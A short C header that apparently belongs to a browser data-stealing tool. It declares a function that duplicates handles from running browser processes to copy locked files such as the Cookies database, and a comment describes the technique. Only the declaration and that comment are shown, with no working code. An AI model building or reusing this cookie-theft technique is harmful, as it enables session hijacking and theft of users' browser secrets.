#pragma once
#ifndef HANDLE_STEAL_H
#define HANDLE_STEAL_H

// Fallback copy path for files the browser keeps locked (e.g. Cookies):
// enumerate the browser processes, walk their handle tables, duplicate a
// matching file handle into this process and stream the bytes out of it.
// Ported from the original project's FetchSecretFiles.cpp.

#include "BrowserDefs.h"

// Finds an open handle to <data root>\pszRelPath inside any running browser
// process, duplicates it and copies the file content to pszDstPath.
BOOL StealAndCopyFileHandle(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath, IN LPCSTR pszDstPath);

#endif // !HANDLE_STEAL_H
